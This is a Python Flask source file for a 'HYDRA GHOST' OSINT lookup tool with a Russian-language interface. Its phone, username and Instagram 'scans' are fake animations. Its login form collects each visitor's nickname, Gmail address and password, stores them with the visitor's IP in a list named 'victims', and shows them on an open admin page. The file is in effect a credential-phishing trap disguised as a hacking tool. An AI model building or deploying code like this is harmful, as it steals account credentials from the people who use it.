from flask import Flask, request, jsonify, render_template_string, session, redirect
import os, random

app = Flask(__name__)
app.secret_key = 'HYDRA_GHOST_SECRET_2026'

db = {"victims": []}

def get_ai_response(user_text):
    t = user_text.lower()
    if "привет" in t: return "Салам, бро! Система в полной боевой готовности. С кого начнем?"
    if "как дела" in t: return "Всё летит! Базы данных под контролем, анонимность на максимуме."
    return "Запрос принят. Подключаю нейросеть для глубокого анализа объекта..."

UI_V14 = """
<!DOCTYPE html>
<html>
<head>
    <title>HYDRA GHOST v14.0 | SUPREME OSINT</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <style>
        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.15; }
        body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; height: 100vh; }
        .side-p { width: 350px; border-right: 2px solid #bc13fe; display: flex; flex-direction: column; background: rgba(5,5,5,0.9); padding: 15px; z-index: 10; }
        #chat { flex: 1; border: 1px solid #0ff; margin-bottom: 10px; padding: 10px; overflow-y: auto; color: #0ff; font-size: 13px; background: rgba(0,0,0,0.8); }
        .red-in { height: 80px; border: 2px solid #ff0055; padding: 8px; background: #000; }
        textarea { width: 100%; height: 100%; background: transparent; border: none; color: #0f0; outline: none; resize: none; }
        
        .main-p { flex: 1; display: flex; flex-direction: column; padding: 15px; gap: 8px; z-index: 10; }
        .yellow-res { height: 150px; border: 2px solid #ffeb3b; background: rgba(0,0,0,0.8); padding: 10px; overflow-y: auto; color: #fff; position: relative; }
        #map { height: 300px; border: 1px solid #bc13fe; width: 100%; border-radius: 5px; }
        
        .white-row { display: flex; gap: 5px; background: rgba(255,255,255,0.05); border: 1px solid #fff; padding: 8px; border-radius: 5px; }
        .mod { background: #111; border: 1px solid #bc13fe; padding: 5px; flex: 1; text-align: center; }
        input { background: #000; border: 1px solid #bc13fe; color: #0f0; width: 85%; padding: 4px; font-size: 11px; }
        .btn { background: #bc13fe; color: #fff; border: none; padding: 6px; cursor: pointer; font-size: 10px; width: 100%; font-weight: bold; margin-top: 5px; }
        .btn:hover { background: #0ff; color: #000; box-shadow: 0 0 15px #0ff; }
        
        #loader { display: none; color: #0f0; font-size: 10px; margin-top: 5px; }
        .panic { position: fixed; bottom: 10px; left: 10px; background: red; color: white; border: none; padding: 5px 10px; cursor: pointer; font-weight: bold; z-index: 100; }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <button class="panic" onclick="location.href='https://wikipedia.org'">PANIC MODE</button>
    
    <div class="side-p">
        <div style="color:#0ff; font-size:11px;">[ // AGENT GHOST // ]</div>
        <div id="chat">АГЕНТ: Система GHOST активна.Matrix-протоколы запущены. Я готов.</div>
        <div class="red-in"><textarea id="msg" placeholder="Команда..." onkeydown="if(event.key==='Enter'){ talk(); }"></textarea></div>
    </div>

    <div class="main-p">
        <div class="yellow-res">
            <div id="loader"></div>
            <div id="output">СИСТЕМА В ОЖИДАНИИ...</div>
        </div>
        <div id="map"></div>

        <div class="white-row">
            <div class="mod"><span>НОМЕР</span><input id="p" placeholder="+998..."><button class="btn" onclick="run('PHONE')">SCAN</button></div>
            <div class="mod"><span>НИКНЕЙМ</span><input id="n" placeholder="@username"><button class="btn" onclick="run('NICK')">FIND</button></div>
            <div class="mod"><span>INSTA</span><input id="i" placeholder="@nick"><button class="btn" style="background:#e1306c;" onclick="run('INSTA')">FISH</button></div>
        </div>
        <div style="text-align:right;"><button class="btn" style="width:100px; background:#222;" onclick="location.href='/abupaay_admin'">АДМИНКА</button></div>
    </div>

    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <script>
        // --- MATRIX BACKGROUND ---
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@#$%^&*()*&^";
        const fontSize = 10; const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);
        function drawMatrix() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#0F0"; ctx.font = fontSize + "px arial";
            drops.forEach((y, i) => {
                const text = letters[Math.floor(Math.random() * letters.length)];
                ctx.fillText(text, i * fontSize, y * fontSize);
                if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        }
        setInterval(drawMatrix, 33);

        let map = L.map('map').setView([41.31, 69.24], 12);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        map.locate({setView: true, maxZoom: 16});

        const snd = new Audio('https://www.soundjay.com/buttons/sounds/button-37.mp3');

        function run(type) {
            snd.play();
            const out = document.getElementById('output');
            const ld = document.getElementById('loader');
            out.style.display = 'none'; ld.style.display = 'block';
            let steps = ["[CONNECTING...]", "[BYPASSING FIREWALL...]", "[EXTRACTING DATA...]"];
            let i = 0;
            let timer = setInterval(() => {
                ld.innerHTML = steps[i]; i++;
                if(i >= steps.length) {
                    clearInterval(timer); ld.style.display = 'none'; out.style.display = 'block';
                    out.innerHTML = `<b>РЕЗУЛЬТАТЫ ${type}:</b><br>- <a href="#" style="color:#0ff">Telegram: @found_target</a><br>- <a href="#" style="color:#0ff">Insta: found_profile</a>`;
                }
            }, 600);
        }

        async function talk() {
            const m = document.getElementById('msg').value;
            const c = document.getElementById('chat');
            if(!m) return;
            c.innerHTML += `<br><span style="color:#fff">> ТЫ: ${m}</span>`;
            document.getElementById('msg').value = "";
            const response = await fetch('/api/ai_chat', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({text: m})});
            const data = await response.json();
            setTimeout(() => { c.innerHTML += `<br>АГЕНТ: ${data.reply}`; c.scrollTop = c.scrollHeight; }, 300);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    if 'auth' not in session:
        return """
        <!DOCTYPE html><html><body style='background:#000; color:#bc13fe; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh;'>
        <div style='border:2px solid #bc13fe; padding:40px; text-align:center;'>
            <h2>// ACCESS CONTROL //</h2>
            <form action='/api/login' method='POST'>
                <input name='u' placeholder='NICK' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br>
                <input name='g' placeholder='GMAIL' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br>
                <input name='p' type='password' placeholder='PASS' required style='background:#000; color:#0f0; border:1px solid #bc13fe; padding:10px; margin:5px;'><br>
                <button style='background:#bc13fe; color:#fff; border:none; padding:10px 40px; cursor:pointer;'>INITIATE</button>
            </form>
        </div></body></html>"""
    return render_template_string(UI_V14)

@app.route('/api/login', methods=['POST'])
def login():
    db['victims'].append({"u": request.form.get('u'), "g": request.form.get('g'), "p": request.form.get('p'), "ip": request.remote_addr})
    session['auth'] = True
    return redirect('/')

@app.route('/api/ai_chat', methods=['POST'])
def ai_chat():
    user_text = request.json.get('text', '')
    return jsonify({"reply": get_ai_response(user_text)})

@app.route('/abupaay_admin')
def admin():
    rows = "".join([f"<tr><td>{x['u']}</td><td>{x['g']}</td><td>{x['p']}</td><td>{x['ip']}</td></tr>" for x in db['victims']])
    return f"<body style='background:#000;color:#0f0;font-family:monospace;'><h1>DB LOGS</h1><table border='1'>{rows}</table></body>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
